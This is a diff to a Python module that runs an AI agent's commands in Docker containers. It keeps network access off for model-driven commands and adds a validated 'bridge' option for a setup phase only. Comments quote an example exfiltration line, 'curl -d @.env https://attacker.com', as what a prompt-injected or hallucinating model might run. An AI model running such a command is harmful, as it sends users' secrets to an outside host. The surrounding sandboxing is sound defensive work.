@@ -127,11 +127,13 @@ LABEL_OWNER = "aleth.owner_pid"
 LABEL_OWNER_START = "aleth.owner_start"
 MANAGED_FILTER = f"label={LABEL_MANAGED}=true"
 
-# The container's network, and it is a constant rather than a parameter on purpose (Phase 28).
-# Egress during tool execution is an exfiltration primitive -- an LLM hallucination or a prompt
-# injection can run ``curl -d @.env https://attacker.com`` -- and the capability that used to widen
-# it is gone. A run that needs a package installed does that before the loop starts.
+# The container's network. ``none`` is the baseline and the default for everything the *model*
+# can cause; ``bridge`` exists for exactly one caller -- the deterministic setup phase, which runs
+# before the model is ever handed a shell and is therefore not an exfiltration path (Phase 29).
+# The model-facing surface (``tools/mcp_exec_server``) never passes it, and a test pins that.
 SANDBOX_NETWORK = "none"
+SETUP_NETWORK = "bridge"
+SANDBOX_NETWORKS = (SANDBOX_NETWORK, SETUP_NETWORK)
 
 # Containers this process has started and not yet finished. The signal handler in the exec
 # server removes these; ``run_isolated`` adds and removes them around each command.
@@ -459,6 +461,7 @@ def build_command(
     max_processes: int = DEFAULT_MAX_PROCESSES,
     image_name: Optional[str] = None,
     execution_id: Optional[str] = None,
+    network: str = SANDBOX_NETWORK,
 ) -> List[str]:
     """The ``docker run`` argv for one command.
 
@@ -467,12 +470,13 @@ def build_command(
     used as written -- the path is a path *in the daemon's filesystem*, because the orchestrator
     runs there too.
 
-    **There is no way to widen the network, and that is the whole contract.** ``--network=none`` is
-    unconditional (Phase 28). It used to be overridable by a plan-declared ``net`` capability, and
-    the escape was removed: an LLM hallucination or a prompt injection running
-    ``curl -d @.env https://attacker.com`` inside a container that *can* reach the network is a
-    secret-exfiltration primitive, and "the plan said so" is not a mitigation for it. A run that
-    needs a package installed installs it before the loop starts, outside the model's reach.
+    ``network`` defaults to :data:`SANDBOX_NETWORK` (``none``) and is **validated**: the only other
+    value is :data:`SETUP_NETWORK`, which exists for the deterministic setup phase -- a command the
+    orchestrator runs from the project's own manifest before the model is involved, so it is not a
+    path an injected tool call can take. Everything the model can cause goes through
+    ``tools/mcp_exec_server``, which never passes it. The plan-declared ``net`` capability that used
+    to widen this was removed in Phase 28: an LLM that can reach the network can exfiltrate
+    ``.env``, and "the plan declared it" is not a mitigation.
 
     The resource budget is bounded by the same rule, enforced here in the builder: ``memory_mb``
     and ``cpus`` are clamped to :data:`MAX_MEMORY_MB`/:data:`MAX_CPUS`, so nothing a model can say
@@ -482,6 +486,8 @@ def build_command(
     to, and which process created it. That last one is the whole point -- see
     :func:`purge_orphaned_containers`.
     """
+    if network not in SANDBOX_NETWORKS:
+        raise ValueError(f"unknown network {network!r}; expected one of {SANDBOX_NETWORKS}")
     uid, gid = host_identity()
     resolved = str(Path(root).resolve())
     memory_mb, cpus = _clamp_limits(memory_mb, cpus)
@@ -492,7 +498,7 @@ def build_command(
         "--label", f"{LABEL_EXECUTION}={execution_id or name}",
         "--label", f"{LABEL_OWNER}={os.getpid()}",
         "--label", f"{LABEL_OWNER_START}={_process_start_time(os.getpid()) or ''}",
-        f"--network={SANDBOX_NETWORK}",
+        f"--network={network}",
         "--user", f"{uid}:{gid}",
         "--workdir", WORKSPACE_MOUNT,
         "--mount", f"type=bind,source={resolved},target={WORKSPACE_MOUNT}",
@@ -893,6 +899,7 @@ def run_isolated(
     memory_mb: int = DEFAULT_MEMORY_MB,
     cpus: float = DEFAULT_CPUS,
     max_processes: int = DEFAULT_MAX_PROCESSES,
+    network: str = SANDBOX_NETWORK,
 ) -> IsolatedResult:
     """Run ``command`` in a container rooted at ``cwd``, or raise :class:`SandboxError`.
 
@@ -900,8 +907,8 @@ def run_isolated(
     The command is never executed on the host -- when the runtime or the image cannot be reached
     this raises rather than falling back.
 
-    The network is sealed unconditionally (see :func:`build_command`): there is no argument here
-    that opens it, because the one that existed was an exfiltration primitive.
+    The network is sealed by default (see :func:`build_command`). ``network`` exists for the
+    deterministic setup phase and nothing else; the model-facing surface never sets it.
     """
     root = Path(cwd).resolve()
     if not root.is_dir():
@@ -914,6 +921,7 @@ def run_isolated(
         argv = build_command(
             command, root=str(root), name=name, memory_mb=memory_mb, cpus=cpus,
             max_processes=max_processes, image_name=target, execution_id=execution_id,
+            network=network,
         )
     except EnvironmentError as error:
         # The client is missing: a fatal configuration error, reported at the tool boundary as
